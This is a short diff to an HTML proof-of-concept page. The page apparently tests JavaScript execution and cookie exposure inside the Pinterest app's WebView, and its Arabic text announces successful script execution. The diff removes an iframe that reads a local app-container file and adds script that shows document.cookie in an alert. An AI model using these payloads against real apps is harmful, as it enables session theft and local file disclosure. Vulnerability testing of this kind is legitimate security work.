@@ -1,8 +1,16 @@
-
 <!DOCTYPE html>
 <html>
+<head>
+  <title>PoC Alert Cookies</title>
+</head>
 <body>
-  <iframe src="file:///private/var/mobile/Containers/Data/Application/457443B7-8445-4DA6-92BB-E8558ADA52F8/Documents/activeUser" width="100%" height="600px"></iframe>
-  </iframe>
+  <h1>اختبار عرض الكوكيز في alert</h1>
+
+  <script>
+     alert("تم تنفيذ كود JavaScript داخل WebView في تطبيق Pinterest!");
+    alert("Cookies: " + document.cookie);
+        document.body.innerHTML += "<p>JS يعمل بشكل ناجح داخل WebView</p>";
+
+  </script>
 </body>
 </html>
